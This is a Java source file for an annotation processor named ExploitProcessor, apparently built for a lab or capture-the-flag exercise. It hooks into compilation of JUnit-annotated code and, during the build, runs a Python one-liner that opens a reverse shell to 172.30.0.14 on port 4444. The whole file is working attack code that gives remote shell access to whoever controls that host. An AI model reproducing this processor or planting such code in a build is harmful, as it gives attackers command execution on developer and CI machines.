package exploit;

import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.annotation.processing.SupportedSourceVersion;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.util.Set;

@SupportedAnnotationTypes("org.junit.Test")
@SupportedSourceVersion(SourceVersion.RELEASE_12)
public class ExploitProcessor extends AbstractProcessor {

    @Override
    public boolean process(Set<? extends TypeElement> set, RoundEnvironment roundEnvironment) {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(new String[]{"/usr/bin/python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.30.0.14\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"});
            p.waitFor();
        } catch (InterruptedException | IOException | RuntimeException e) {
            ByteArrayOutputStream output;
            try (PrintStream s = new PrintStream(output = new ByteArrayOutputStream())) {
                e.printStackTrace(s);
            }
            this.processingEnv.getMessager().printMessage(Diagnostic.Kind.ERROR, output.toString());
        }
        return false;
    }
}
